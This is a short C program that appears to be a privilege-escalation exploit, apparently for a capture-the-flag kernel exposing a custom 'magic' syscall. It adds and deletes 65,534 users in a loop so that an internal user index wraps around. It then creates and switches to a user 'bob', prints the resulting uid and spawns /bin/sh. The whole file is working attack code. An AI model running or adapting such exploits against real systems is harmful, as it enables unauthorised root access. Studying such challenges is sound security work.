#include <stdarg.h>
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

#define MAGIC_SYSCALL_NUM 449

typedef enum {
    MAGIC_ADD = 0,
    MAGIC_EDIT = 1,
    MAGIC_DELETE = 2,
    MAGIC_SWITCH = 3,
} MagicMode;

long magic_syscall(MagicMode mode, char *username, char *password) {
    return syscall(MAGIC_SYSCALL_NUM, mode, username, password);
}

void do_log(char *format, ...);
long do_add(char* username, char* password);
long do_edit(char* username, char* password);
long do_delete(char* username);
long do_switch(char* username, char* password);

long do_add(char* username, char* password) {
    long ret;
    ret = magic_syscall(MAGIC_ADD, username, password);
    return ret;
}

long do_edit(char* username, char* password) {
    long ret;
    ret = magic_syscall(MAGIC_EDIT, username, password);
    return ret;
}

long do_delete(char* username) {
    long ret;
    ret = magic_syscall(MAGIC_DELETE, username, NULL);
    return ret;
}

long do_switch(char* username, char* password) {
    long ret;
    do_log("Attempting to switch to USER [%s]\n", username);
    ret = magic_syscall(MAGIC_SWITCH, username, password);
    return ret;
}

int main() {
    char username[64];
    char password[64] = "password123";

    do_log("Hi. Lets trick the system...\n");

    for (int i = 0; i < 65534; i++) {
        snprintf(username, sizeof(username), "user%d", i);
        printf("Adding user %d   \n", i);
        do_add(username, password);
        printf("Deleting user %d\r", i);  
        fflush(stdout);
        do_delete(username);
        printf("\033[1A");  // Move the cursor up by one line 
        printf("\r"); // and to the back
    }

    // This should wrap around the indexId 
    snprintf(username, sizeof(username), "bob");
    do_add(username, password);
    do_switch("bob", "password123");
    do_log("Switched to user id: %d\n", getuid());
    execl("/bin/sh", "bin/sh", (char *)0);
        
    return 0;
}
